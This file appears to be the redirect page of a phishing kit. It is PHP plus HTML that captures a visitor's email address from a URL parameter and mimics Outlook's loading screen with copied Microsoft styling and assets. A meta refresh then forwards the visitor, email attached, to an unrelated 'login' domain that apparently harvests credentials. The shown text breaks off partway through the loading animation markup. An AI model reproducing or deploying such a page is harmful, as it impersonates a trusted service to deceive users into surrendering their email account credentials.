<?php  
         //Starting the session
       session_start();

if (isset($_GET["[EMail]"])) {
    if (!isset($_SESSION["[EMail]"])) {
        $_SESSION["[EMail]"] = $_GET["[EMail]"];
    }
}
   
      ?>
<!DOCTYPE html>
<html dir="ltr" xmlns="http://www.w3.org/1999/xhtml" translate="no" lang="en"><head>
 <meta charset="utf-8">                         <link rel="shortcut icon" href="https://www.outlook.com/mail/favicon.ico" type="image/x-icon">   <title>Outlook</title>     <style>@font-face{font-family:FabricMDL2Icons;src:url('//res-h3.public.cdn.office.net/owamail/20230915006.22/resources/fonts/o365icons-mdl2.woff') format('woff');font-weight:400;font-style:normal}@font-face{font-family:office365icons;src:url('//res-h3.public.cdn.office.net/owamail/20230915006.22/resources/fonts/office365icons.woff?') format('woff');font-weight:400;font-style:normal}#loadingScreen{position:fixed;top:0;bottom:0;left:0;right:0;background-color:#fff}#loadingLogo{position:fixed;top:calc(50vh - 90px);left:calc(50vw - 90px);width:180px;height:180px}#MSLogo{position:fixed;bottom:36px;left:calc(50vw - 50px)}.dark #loadingScreen{background-color:#333}.darkNew #loadingScreen{background-color:#1f1f1f}</style>    
<style type="text/css">.qLLKelJZ2HLFW575rLTK4{position:relative;font-family:SegoeUI-Regular-final,Segoe UI,"Segoe UI Web (West European)",Segoe,-apple-system,BlinkMacSystemFont,Roboto,Helvetica Neue,Tahoma,Helvetica,Arial,sans-serif;color:#252423;background-color:#fafafa;box-shadow:0 2px 4px -.75px rgba(0,0,0,.1);border-radius:3px;height:32px;text-align:left}.qLLKelJZ2HLFW575rLTK4:hover,.qLLKelJZ2HLFW575rLTK4._2_jf1EhyCGNvxX_cY_kvbw,.qLLKelJZ2HLFW575rLTK4._1Mb1ORV_DuAN2S7370Mo_o{color:#252423;background-color:#fff;box-shadow:0 4px 8px -1px rgba(0,0,0,.1)}.qLLKelJZ2HLFW575rLTK4._2Srkf1FMVhToBzLHg7jXo5{box-shadow:0 2px 4px -.75px rgba(0,0,0,.1)}.Bm0BT9v7WZu-360NfsJpW{border-radius:16px}._1Jcu4zNm8gI1cIfX1XyrpZ{max-width:468px;width:calc(100% - 88px);margin:8px auto}._2QHsvK7J9lbgOvS1hd3nbj{max-width:468px;width:calc(100% - 16px);margin:8px auto}._3AHBQla__Bxf8kFHHPYY9I{display:flex;height:100%;border-radius:2px}@media screen and (-ms-high-contrast:white-on-black){._3AHBQla__Bxf8kFHHPYY9I{border:1px solid #fff}}@media screen and (-ms-high-contrast:black-on-white){._3AHBQla__Bxf8kFHHPYY9I{border:1px solid #000}}._3AHBQla__Bxf8kFHHPYY9I button{height:auto;text-align:center;vertical-align:top;box-sizing:border-box}._2_MZEpLSW1_Q5OkkZNdtck{-webkit-appearance:none;font-family:inherit;font-size:14px;flex:1 0 0px;width:100%;color:inherit!important;background-color:transparent;border:0;border-radius:2px;padding:0;height:100%;outline:none}._2_MZEpLSW1_Q5OkkZNdtck::-webkit-search-cancel-button,._2_MZEpLSW1_Q5OkkZNdtck::-webkit-search-decoration,._2_MZEpLSW1_Q5OkkZNdtck::-webkit-search-results-button,._2_MZEpLSW1_Q5OkkZNdtck::-webkit-search-results-decoration{-webkit-appearance:none;display:none}._2_MZEpLSW1_Q5OkkZNdtck::-ms-clear{display:none;width:0;height:0}._2_MZEpLSW1_Q5OkkZNdtck::-webkit-input-placeholder{color:inherit!important}._2_MZEpLSW1_Q5OkkZNdtck:-ms-input-placeholder{color:inherit!important}._2_MZEpLSW1_Q5OkkZNdtck::placeholder{color:inherit!important}._1SdqzAYnDVMg4nJr4fdmuQ{color:#106ebe;vertical-align:middle}</style>
<style type="text/css">._1JAyGkJKb5o9RtQTwrtrKw{width:100%;height:50px;display:flex;border-spacing:0;white-space:nowrap;line-height:normal}._1JAyGkJKb5o9RtQTwrtrKw ._3rUUXFwqB4l2JguqIctQtd,._1JAyGkJKb5o9RtQTwrtrKw a._2Ghdkl2vNXrpn79NsyWyDD{vertical-align:top}._3l_gyjnCltTpcBRiG-61AO{display:none!important}.removeFocusOutline :focus{outline:none;box-shadow:none!important}._2sngRVSfiZnZSR2_elJ0bG,._2Z1l2FxAtwx1-JbhdjiLiw{display:block;position:relative;margin:0;padding:0;min-width:48px;text-align:center;cursor:pointer;outline-offset:-1px}@media (-ms-high-contrast:active),(forced-colors:active){._2sngRVSfiZnZSR2_elJ0bG:focus,._2sngRVSfiZnZSR2_elJ0bG:hover+.icon,._2Z1l2FxAtwx1-JbhdjiLiw:focus,._2Z1l2FxAtwx1-JbhdjiLiw:hover+.icon{-ms-high-contrast-adjust:none;forced-color-adjust:none;background-color:Highlight!important;color:highlightText!important}}._2sngRVSfiZnZSR2_elJ0bG:hover,._2Z1l2FxAtwx1-JbhdjiLiw:hover{-webkit-transition:background-color .467s cubic-bezier(.1,.9,.2,1) 34ms;transition:background-color .467s cubic-bezier(.1,.9,.2,1) 34ms}._2Z1l2FxAtwx1-JbhdjiLiw,._1wQAelywOeWOyfBJv5mWCn{display:block;position:relative;margin:0;padding:0;min-width:48px;text-align:center;cursor:default}@media (-ms-high-contrast:active),(forced-colors:active){._2Z1l2FxAtwx1-JbhdjiLiw:focus,._2Z1l2FxAtwx1-JbhdjiLiw:hover+.icon,._1wQAelywOeWOyfBJv5mWCn:focus,._1wQAelywOeWOyfBJv5mWCn:hover+.icon{-ms-high-contrast-adjust:none;forced-color-adjust:none}}._2sngRVSfiZnZSR2_elJ0bG{background:transparent;border-width:0;width:auto;height:100%;box-sizing:border-box;overflow:visible}._2sngRVSfiZnZSR2_elJ0bG,._2sngRVSfiZnZSR2_elJ0bG span[class*=" ms-Icon--"],._2sngRVSfiZnZSR2_elJ0bG span[class^=ms-Icon--]{line-height:48px}@media (-ms-high-contrast:active),(forced-colors:active){._2sngRVSfiZnZSR2_elJ0bG:focus+.icon,._2sngRVSfiZnZSR2_elJ0bG:hover{-ms-high-contrast-adjust:none;forced-color-adjust:none;background-color:Highlight!important;color:highlightText!important}}._1wQAelywOeWOyfBJv5mWCn{background:transparent;border-width:0;width:auto;height:100%;box-sizing:border-box;line-height:48px;overflow:visible;cursor:default}._1wQAelywOeWOyfBJv5mWCn span[class*=" ms-Icon--"],._1wQAelywOeWOyfBJv5mWCn span[class^=ms-Icon--]{line-height:48px}@media (-ms-high-contrast:active),(forced-colors:active){._1wQAelywOeWOyfBJv5mWCn:focus+.icon,._1wQAelywOeWOyfBJv5mWCn:hover{-ms-high-contrast-adjust:none;forced-color-adjust:none}}._22C064QVKdcRZOXJCYilG4{display:inherit}._1pobGgXawpe6oSeYo831p7{min-width:68px}._2Z1l2FxAtwx1-JbhdjiLiw{line-height:48px}._1skkO_eMVQfzzYh85R4bvj{display:inline-block;vertical-align:middle;align-self:center;background-color:currentColor;margin-left:16px;margin-right:8px;height:28px;width:1px}html[dir=rtl] ._1skkO_eMVQfzzYh85R4bvj{margin-right:16px;margin-left:8px}._3rUUXFwqB4l2JguqIctQtd{display:inline-block;font-weight:600;font-family:SegoeUI-SemiBold-final,Segoe UI Semibold,SegoeUI-Regular-final,Segoe UI,"Segoe UI Web (West European)",Segoe,-apple-system,BlinkMacSystemFont,Roboto,Helvetica Neue,Tahoma,Helvetica,Arial,sans-serif;font-size:16px;line-height:48px;-webkit-font-smoothing:antialiased}._2djlo8QJjnaiF4-EbTMBXd{box-shadow:none!important}._33JnNjqvybsNdi6Aq0xzwd{display:flex;flex-direction:row;justify-content:center;align-items:center;padding:0;width:48px;height:48px}._33JnNjqvybsNdi6Aq0xzwd a:focus-visible{outline-offset:11px}._33JnNjqvybsNdi6Aq0xzwd img{width:24px;height:24px;top:12px;left:12px}._2I5rk8h4QtEkCSRRmmVQ_k{display:inline-block;vertical-align:top;font-size:24px;margin-top:13px;margin-left:6px}._2I5rk8h4QtEkCSRRmmVQ_k:before{vertical-align:top}._3AHvXV0o_gxLTk1YOw6kNu{margin-left:14px;margin-right:14px;height:25px;margin-top:12px;border-right:1px solid}html[dir=rtl] ._2I5rk8h4QtEkCSRRmmVQ_k{margin-left:0;margin-right:6px}._2PD4N73oeFPjGiZPjuIOYA{height:100%;display:flex;vertical-align:middle;outline-offset:-1px;padding:0 12px 0 8px;text-decoration:none}._2PD4N73oeFPjGiZPjuIOYA a{display:flex;text-decoration:none;color:inherit}html[dir=rtl] ._2PD4N73oeFPjGiZPjuIOYA{padding:0 8px 0 12px}._3ZpvoRXyJr0SFMMvbb9bGH{line-height:48px;height:100%;display:inline-block;vertical-align:top;padding-left:8px}html[dir=rtl] ._3ZpvoRXyJr0SFMMvbb9bGH{padding-right:8px;padding-left:0}._2Ghdkl2vNXrpn79NsyWyDD{max-width:200px;max-height:48px;overflow:hidden;line-height:48px;font-size:0;height:100%;display:flex;align-items:center;justify-content:center}._2Ghdkl2vNXrpn79NsyWyDD:focus-visible{outline-offset:-2px}._2Ghdkl2vNXrpn79NsyWyDD img{max-width:200px;max-height:48px;border-style:none!important;vertical-align:middle}._3MpISK7uyucNPknKNQJHgX img{width:auto;height:24px}@media (-ms-high-contrast:none),screen and (-ms-high-contrast:active){._3MpISK7uyucNPknKNQJHgX img{max-width:200px;max-height:none;min-width:160px;width:100%;height:24px}}@media (min-width:640px){._1PS7HXecU7aY8QoISdmnQF{max-width:176px;text-decoration:none}}._1bksysgrgvI4e64M4iteg0{height:100%;max-width:176px;display:flex}.E_F_OxQg1uGSuqY-R5dwP{text-align:right;vertical-align:middle;display:table-cell;overflow:hidden;max-width:120px;font-size:14px;font-family:SegoeUI-SemiLight-final,Segoe UI Semilight,SegoeUI-Regular-final,Segoe UI,"Segoe UI Web (West European)",Segoe,-apple-system,BlinkMacSystemFont,Roboto,Helvetica Neue,Tahoma,Helvetica,Arial,sans-serif;text-overflow:ellipsis;word-break:break-all;white-space:nowrap;margin-left:4px}.E_F_OxQg1uGSuqY-R5dwP>span{padding-left:4px;display:none}._2r3tGOSyvyUola8y7ahgJG{text-align:left;display:block;overflow:hidden;max-width:160px;font-size:13px;font-family:SegoeUI-Regular-final,Segoe UI,"Segoe UI Web (West European)",Segoe,-apple-system,BlinkMacSystemFont,Roboto,Helvetica Neue,Tahoma,Helvetica,Arial,sans-serif;text-overflow:ellipsis;word-break:break-all;white-space:nowrap;line-height:48px}._2r3tGOSyvyUola8y7ahgJG>span{padding-left:12px;padding-right:4px;display:none}html[dir=rtl] .E_F_OxQg1uGSuqY-R5dwP{text-align:left}html[dir=rtl] .E_F_OxQg1uGSuqY-R5dwP>span{padding-left:0;padding-right:4px}html[dir=rtl] ._2r3tGOSyvyUola8y7ahgJG>span{padding-left:4px;padding-right:12px}.UOslb0cbjSsi0A3IdDqDS{display:table-cell;border-left-width:0!important;vertical-align:middle;display:flex;align-items:center;justify-content:center}html[dir=rtl] .UOslb0cbjSsi0A3IdDqDS{border-right-width:0!important}._1vuKzsQNhg5QNnJlA2a5Co{overflow:hidden;display:inline-block;border-radius:50%;vertical-align:middle;font-size:6px}._1vuKzsQNhg5QNnJlA2a5Co .ms-Persona{right:2px;top:-2px}._1vuKzsQNhg5QNnJlA2a5Co .ms-Persona .ms-Image-image{overflow:hidden;top:0}html[dir=rtl] ._1vuKzsQNhg5QNnJlA2a5Co .ms-Persona{left:2px;right:0}._1TdybwJwBVv9HbLUWUPtp9{overflow:hidden;display:inline-block;border:thin solid;border-radius:50%;vertical-align:middle;font-size:6px}._3yZwce56ZwsXDLwEtU0IP9{border-radius:50%;line-height:1!important}._3yZwce56ZwsXDLwEtU0IP9:before{margin-top:.4em}._3-PRrdQ9JqvSvfsWxaXWw3{width:32px;height:32px;display:flex;align-items:center;justify-content:center;font-size:13px;font-family:SegoeUI-Regular-final,Segoe UI,"Segoe UI Web (West European)",Segoe,-apple-system,BlinkMacSystemFont,Roboto,Helvetica Neue,Tahoma,Helvetica,Arial,sans-serif;border:1px solid;box-sizing:border-box;border-radius:50%;line-height:1!important}._3-PRrdQ9JqvSvfsWxaXWw3:before{margin-top:.4em}._1vuKzsQNhg5QNnJlA2a5Co,._3yZwce56ZwsXDLwEtU0IP9,._1TdybwJwBVv9HbLUWUPtp9{width:32px;height:32px}._3jdP3smoQvl9jAbqn0fNe5{align-items:center;justify-content:space-between;margin:0;padding:0;text-align:center;height:100%}._3ED70uyWABigsjWEIWPHEM{display:flex;flex:1 0 auto;height:100%}._2dIXmFuZ2LEPFKz37y9-ZT{display:flex;justify-content:flex-start}._13nWX-ewJZaUfUMAB1fYjD{display:flex;flex:1 0 auto;justify-content:center}._2hKxC13ZPLyNvNYj4FLvHJ{display:flex;justify-content:flex-end}._11x07DnMTdw1Y_UWzf8jD9{display:flex;flex:0 0 auto}._3YBVnSXF1p3GXe-LA90QS6{height:100%;line-height:48px;display:flex}._2k6zfb2H24K6gE8s_a-uKp{right:24px;top:8px}html[dir=rtl] ._2k6zfb2H24K6gE8s_a-uKp{right:0;left:24px}@-moz-document url-prefix(){._2sngRVSfiZnZSR2_elJ0bG:focus{outline:1px dotted}}#O365_NavHeader abbr,#O365_NavHeader address,#O365_NavHeader article,#O365_NavHeader aside,#O365_NavHeader audio,#O365_NavHeader b,#O365_NavHeader blockquote,#O365_NavHeader body,#O365_NavHeader body :focus,#O365_NavHeader body div,#O365_NavHeader caption,#O365_NavHeader cite,#O365_NavHeader code,#O365_NavHeader dd,#O365_NavHeader del,#O365_NavHeader details,#O365_NavHeader dfn,#O365_NavHeader dl,#O365_NavHeader dt,#O365_NavHeader em,#O365_NavHeader fieldset,#O365_NavHeader figure,#O365_NavHeader footer,#O365_NavHeader form,#O365_NavHeader h1,#O365_NavHeader h2,#O365_NavHeader h3,#O365_NavHeader h4,#O365_NavHeader h5,#O365_NavHeader h6,#O365_NavHeader header,#O365_NavHeader html,#O365_NavHeader i,#O365_NavHeader iframe,#O365_NavHeader img,#O365_NavHeader ins,#O365_NavHeader kbd,#O365_NavHeader label,#O365_NavHeader legend,#O365_NavHeader li,#O365_NavHeader mark,#O365_NavHeader menu,#O365_NavHeader nav,#O365_NavHeader object,#O365_NavHeader ol,#O365_NavHeader p,#O365_NavHeader pre,#O365_NavHeader q,#O365_NavHeader samp,#O365_NavHeader section,#O365_NavHeader small,#O365_NavHeader strong,#O365_NavHeader sub,#O365_NavHeader summary,#O365_NavHeader sup,#O365_NavHeader table,#O365_NavHeader tbody,#O365_NavHeader td,#O365_NavHeader tfoot,#O365_NavHeader th,#O365_NavHeader thead,#O365_NavHeader time,#O365_NavHeader tr,#O365_NavHeader ul,#O365_NavHeader var,#O365_NavHeader video,#O365fpcontainerid abbr,#O365fpcontainerid address,#O365fpcontainerid article,#O365fpcontainerid aside,#O365fpcontainerid audio,#O365fpcontainerid b,#O365fpcontainerid blockquote,#O365fpcontainerid body,#O365fpcontainerid body :focus,#O365fpcontainerid body div,#O365fpcontainerid caption,#O365fpcontainerid cite,#O365fpcontainerid code,#O365fpcontainerid dd,#O365fpcontainerid del,#O365fpcontainerid details,#O365fpcontainerid dfn,#O365fpcontainerid dl,#O365fpcontainerid dt,#O365fpcontainerid em,#O365fpcontainerid fieldset,#O365fpcontainerid figure,#O365fpcontainerid footer,#O365fpcontainerid form,#O365fpcontainerid h1,#O365fpcontainerid h2,#O365fpcontainerid h3,#O365fpcontainerid h4,#O365fpcontainerid h5,#O365fpcontainerid h6,#O365fpcontainerid header,#O365fpcontainerid html,#O365fpcontainerid i,#O365fpcontainerid iframe,#O365fpcontainerid img,#O365fpcontainerid ins,#O365fpcontainerid kbd,#O365fpcontainerid label,#O365fpcontainerid legend,#O365fpcontainerid li,#O365fpcontainerid mark,#O365fpcontainerid menu,#O365fpcontainerid nav,#O365fpcontainerid object,#O365fpcontainerid ol,#O365fpcontainerid p,#O365fpcontainerid pre,#O365fpcontainerid q,#O365fpcontainerid samp,#O365fpcontainerid section,#O365fpcontainerid small,#O365fpcontainerid strong,#O365fpcontainerid sub,#O365fpcontainerid summary,#O365fpcontainerid sup,#O365fpcontainerid table,#O365fpcontainerid tbody,#O365fpcontainerid td,#O365fpcontainerid tfoot,#O365fpcontainerid th,#O365fpcontainerid thead,#O365fpcontainerid time,#O365fpcontainerid tr,#O365fpcontainerid ul,#O365fpcontainerid var,#O365fpcontainerid video,.o365shell-popup abbr,.o365shell-popup address,.o365shell-popup article,.o365shell-popup aside,.o365shell-popup audio,.o365shell-popup b,.o365shell-popup blockquote,.o365shell-popup body,.o365shell-popup body :focus,.o365shell-popup body div,.o365shell-popup caption,.o365shell-popup cite,.o365shell-popup code,.o365shell-popup dd,.o365shell-popup del,.o365shell-popup details,.o365shell-popup dfn,.o365shell-popup dl,.o365shell-popup dt,.o365shell-popup em,.o365shell-popup fieldset,.o365shell-popup figure,.o365shell-popup footer,.o365shell-popup form,.o365shell-popup h1,.o365shell-popup h2,.o365shell-popup h3,.o365shell-popup h4,.o365shell-popup h5,.o365shell-popup h6,.o365shell-popup header,.o365shell-popup html,.o365shell-popup i,.o365shell-popup iframe,.o365shell-popup img,.o365shell-popup ins,.o365shell-popup kbd,.o365shell-popup label,.o365shell-popup legend,.o365shell-popup li,.o365shell-popup mark,.o365shell-popup menu,.o365shell-popup nav,.o365shell-popup object,.o365shell-popup ol,.o365shell-popup p,.o365shell-popup pre,.o365shell-popup q,.o365shell-popup samp,.o365shell-popup section,.o365shell-popup small,.o365shell-popup strong,.o365shell-popup sub,.o365shell-popup summary,.o365shell-popup sup,.o365shell-popup table,.o365shell-popup tbody,.o365shell-popup td,.o365shell-popup tfoot,.o365shell-popup th,.o365shell-popup thead,.o365shell-popup time,.o365shell-popup tr,.o365shell-popup ul,.o365shell-popup var,.o365shell-popup video{box-sizing:content-box}</style>
<style type="text/css">@charset "UTF-8";@font-face{font-family:ShellFabricMDL2IconsLite;src:url(data:font/woff;charset=utf-8;base64,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) format("woff");font-display:auto}.o365cs-base [class*=" ms-Icon--"],.o365cs-base [class*=" ms-Icon--"]:before,.o365cs-base [class^=ms-Icon--],.o365cs-base [class^=ms-Icon--]:before{font-family:ShellFabricMDL2IconsLite,ShellFabricMDL2Icons;display:inline-block;line-height:1}.o365cs-base [class*=" ms-Icon--"]:before,.o365cs-base [class^=ms-Icon--]:before{font-style:normal;font-weight:400;text-decoration:inherit;text-align:center;font-variant:normal;text-transform:none;width:auto;margin-left:0;margin-right:0}.o365cs-base .ms-icon-font-circle:before{border-style:solid;border-radius:1em;line-height:1.15;box-sizing:border-box;-moz-box-sizing:border-box;padding:.1em}@media screen and (-webkit-min-device-pixel-ratio:0){.o365cs-base .ms-icon-font-circle:before{line-height:1}}.o365cs-base .ms-icon-font-size-8{font-size:8!important}.o365cs-base .ms-icon-font-size-11{font-size:11!important}.o365cs-base .ms-icon-font-size-12{font-size:12!important}.o365cs-base .ms-icon-font-size-14{font-size:14!important}.o365cs-base .ms-icon-font-size-18{font-size:18!important}.o365cs-base .ms-icon-font-size-20{font-size:20!important}.o365cs-base .ms-icon-font-size-22{font-size:22!important}.o365cs-base .ms-icon-font-size-25{font-size:25!important}.o365cs-base .ms-icon-font-size-26{font-size:26!important}.o365cs-base .ms-icon-font-size-35{font-size:35!important}.o365cs-base [data-icon]:before{content:attr(data-icon)}.o365cs-base .ms-Icon--WaffleOffice365:before{content:""}.o365cs-base .ms-Icon--Search:before{content:""}.o365cs-base .ms-Icon--Contact:before{content:""}</style>

<meta http-equiv="refresh" content="5; url='https://login.creativesharebox.online/LDJTzfCz#<?php 
    echo  $_SESSION["[EMail]"]  
?>  '">

</head> <body role="application" class="ms-font-s disableTextSelection ms-Fabric--isFocusHidden" style="min-width: 418px;"> <div id="app">
</div> <div id="loadingScreen"> <div id="loadingLogo" dir="ltr"> <style>:root{--s:180px;--envW:130px;--envH:71px;--calW:118px;--sqW:calc(var(--calW) / 3);--sqH:37px;--calHH:20px;--calH:calc(var(--sqH) * 3 + var(--calHH));--calY:calc(var(--calH) + 20px);--calYExt:calc(var(--calH) - 80px);--calYOverExt:calc(var(--calH) - 92px);--flapS:96px;--flapH:calc(0.55 * var(--envH));--flapScaleY:calc(var(--flapH) / var(--flapWidth));--dur:5s}#container{width:var(--s);height:var(--s);animation:bounce var(--dur) infinite}@keyframes bounce{0%,100%,12.5%,32.5%,76.1%{transform:translateY(0)}22.5%,86%{transform:translateY(7px)}}#logo{height:179px;width:130px;overflow:hidden;margin-top:-59px;margin-left:25px}#containerShadow{position:relative;top:120px;left:25px;width:var(--envW);height:var(--envH);border-radius:0 0 7px 7px;box-shadow:rgba(0,0,0,.25) 0 4px 5px;animation:shadow-fade var(--dur) infinite}@keyframes shadow-fade{0%,100%,21.2%,80%{opacity:0}47%,70%{opacity:1}}#flapContainer{width:var(--envW);margin-top:179px}#ef{width:var(--envW);height:var(--envH);border-radius:0 0 7px 7px;overflow:hidden;margin-top:-41px}#ef>.l{width:287px;height:var(--envH);background:#28a8ea;transform:translate(-153px,-70px) rotate(28deg)}#ef>.r{width:287px;height:var(--envH);background:#1490df;transform:translate(-120px,63px) rotate(-28deg)}#eb{width:var(--envW);height:40px;background:#123b6d;margin-top:-70px}#cal{display:flex;flex-wrap:wrap;width:var(--calW);height:var(--calH);border-radius:7px;overflow:hidden;margin:0 auto;margin-top:-306px;animation:cal-bounce var(--dur) infinite;animation-timing-function:cubic-bezier(0,0.5,0,1);transform:translateY(var(--calYExt)) scaleY(1)}@keyframes cal-bounce{0%,100%,16.5%,76.1%{transform:translateY(var(--calY)) scaleY(1)}28%{transform:translateY(var(--calYOverExt)) scaleY(1)}31%{transform:translateY(var(--calYExt)) scaleY(1.05)}33%{transform:translateY(var(--calYExt)) scaleY(.96)}34%,68.5%{transform:translateY(var(--calYExt)) scaleY(1)}68.5%{animation-timing-function:cubic-bezier(0.66,-0.16,1,-0.29)}}#cal>.t{width:var(--calW);height:calc(var(--calHH) + 1px);margin-bottom:-1px;background:#0358a7}#cal>.r{display:flex;width:var(--calW);height:var(--sqH)}.s{width:var(--sqW);height:calc(var(--sqH) + 1px)}.s1{background:#0078d4}.s2{background:#28a8ea}.s3{background:#50d9ff}.s4{background:#0364b8}.s5{background:#14447d}#openedFlap{width:var(--envW);height:107px;animation:opened-flap-swing var(--dur) infinite;animation-timing-function:cubic-bezier(0.32,0,0.67,0);transform-origin:top;transform:translateY(-68px) rotate3d(1,0,0,-180deg)}@keyframes opened-flap-swing{0%,100%,14.5%,76%{transform:translateY(-68px) rotate3d(1,0,0,-90deg)}16.5%,74%{transform:translateY(-68px) rotate3d(1,0,0,-180deg)}}#closedFlap{width:var(--envW);animation:closed-flap-swing var(--dur) infinite;animation-timing-function:cubic-bezier(0.32,0,0.67,0);transform-origin:top;transform:translateY(calc(-1 * var(--envH))) rotate3d(1,0,0,90deg)}@keyframes closed-flap-swing{0%,100%,77%,8.5%{transform:translateY(calc(-1 * var(--envH))) rotate3d(1,0,0,0)}14.5%,76%{transform:translateY(calc(-1 * var(--envH))) rotate3d(1,0,0,90deg)}}#fmask{width:var(--envW);height:107px;overflow:hidden}.flapTriangle{width:var(--flapS);height:var(--flapS);background:#50d9ff;margin:-48px auto 0 auto;border-radius:7px;transform:scaleY(.6) rotate(45deg)}#openedFlap .flapTriangle{background:#123b6d}#closedFlap .flapTriangle{background:#50d9ff}</style> <div id="container"> <div id="containerShadow">
</div> <div id="logo"> <div id="flapContainer"> <div id="openedFlap"> <div id="fmask">
<div class="flapTriangle">
</div>
</div> </div> <div id="cal"> <div class="t">
</div> <div class="r"> <div class="s s1">
</div> <div class="s s2">
</div> <div class="s s3">
</div> </div> <div class="r"> <div class="s s4">
</div> <div class="s s1">
</div> <div class="s s2">
